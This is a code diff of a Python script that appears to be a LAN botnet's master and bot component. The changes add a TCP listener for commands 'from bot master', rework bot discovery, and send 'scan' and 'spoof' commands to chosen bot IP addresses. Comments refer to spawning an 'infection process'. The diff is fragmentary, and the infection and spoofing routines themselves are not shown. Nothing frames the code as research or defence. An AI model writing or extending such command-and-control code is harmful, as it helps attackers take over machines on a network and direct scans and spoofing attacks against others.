@@ -128,10 +128,32 @@ def ip_list():
 # search for all the active bots in LAN
 def search_bots():
     global lan_tree
+    old_lan = lan_tree
     lan_tree = []
-    for bot in lan_tree:
-        master_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        master_socket.sendto("####".encode(), (bot, 48000))
+    master_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    for bot in old_lan:
+        for i in range(20):
+            master_socket.sendto("####".encode(), (bot, 48000))
+
+
+def listener():
+    tcp_listener = socket.socket()
+    tcp_listener.bind(("0.0.0.0", 49000))
+    tcp_listener.listen()
+
+    # waiting for command (later receives from bot master)
+    while True:
+        (client_socket, client_address) = tcp_listener.accept()
+        print(client_address)
+        con_th = threading.Thread(target=con_thread_master, args=(client_socket, client_address,))
+        con_th.start()
+
+
+def con_thread_master(sock, addr):
+    while True:
+        result = sock.recv(1024).decode()
+        if result not in results:
+            results.append(result)
 
 
 if __name__ == '__main__':
@@ -143,6 +165,8 @@ if __name__ == '__main__':
 
     ips = ip_list()
     lan_tree = []
+    results = []
+    connections = []
 
     send_thread = threading.Thread(target=send_to_network)
     recv_thread = threading.Thread(target=recv_replies)
@@ -156,7 +180,7 @@ if __name__ == '__main__':
     data = ""
     output = ""
     clients = []
-    connections = []
+    connection = ""
 
     # tries to spawn the infection process
     try:
@@ -170,7 +194,9 @@ if __name__ == '__main__':
         print("can_infect")
 
     tcp_socket = socket.socket()
-    tcp_socket.bind(("0.0.0.0", 49000))
+
+    listener_thread = threading.Thread(target=listener)
+    listener_thread.start()
 
     # waiting for command (later receives from bot master)
     while True:
@@ -201,12 +227,18 @@ if __name__ == '__main__':
                 botip = input("enter bot ip (q to quit)")
                 if botip != "q":
                     try:
-                        if botip not in connections:
+                        if not connection:
                             tcp_socket.connect((botip, 49000))
-                        tcp_socket.send("get_tree".encode())
-                        print(tcp_socket.recv(1024).decode())
-                        connections.append(botip)
+                        msg = "get_tree-" + botip
+                        tcp_socket.send(msg.encode())
+                        while True:
+                            if results:
+                                print(results.pop())
+                                results = []
+                                break
+                        connection = botip
                     except Exception as e:
+                        connection = ""
                         print(str(e))
             elif master_command == "show_entire_network":
                 pass
@@ -214,16 +246,23 @@ if __name__ == '__main__':
                 botip = input("enter bot ip (q to quit)")
                 if botip != "q":
                     try:
-                        if botip not in connections:
+                        if not connection:
                             tcp_socket.connect((botip, 49000))
-                            connections.append(botip)
+                            connection = botip
                         command = input("enter command")
                         if command.find("scan") != -1:
-                            tcp_socket.send(command.encode())
-                            print(tcp_socket.recv(1024).decode())
-                        if command == "spoof":
-                            tcp_socket.send(command.encode())
+                            msg = command + "-" + botip
+                            tcp_socket.send(msg.encode())
+                            while True:
+                                if results:
+                                    print(results.pop())
+                                    results = []
+                                    break
+                        if command.find("spoof") != -1:
+                            msg = command + "-" + botip + "-" + ip
+                            tcp_socket.send(msg.encode())
                     except Exception as e:
+                        connection = ""
                         print(str(e))
                 pass
             # elif master_command == "show_scan":
